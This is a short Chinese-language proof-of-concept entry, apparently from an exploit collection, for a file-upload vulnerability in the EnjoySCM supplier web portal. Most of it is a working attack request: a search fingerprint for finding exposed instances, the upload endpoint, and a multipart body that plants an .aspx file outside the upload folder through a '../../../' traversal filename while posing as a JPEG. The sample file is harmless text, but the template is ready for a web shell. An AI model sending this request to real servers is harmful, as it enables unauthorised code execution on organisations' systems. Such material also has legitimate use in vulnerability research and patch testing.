# EnjoySCM存在文件上传漏洞

- **系统**：EnjoySCM　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title=”供应商网上服务厅”`
- **请求**：`POST /File/UploadFile HTTP/1.1`
- **关键头**：`Host: {{Hostname}}`　`X-Requested-With: XMLHttpRequest`　`Content-Type: multipart/form-data; boundary=---------------------------219…`　`Content-Length: 460`

**请求体 / payload**
```
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="file"; filename="../../../0301.aspx"
Content-Type: image/jpeg
Hello Word!
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="action"
unloadfile
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="filepath"
-----------------------------21909179191068471382830692394
```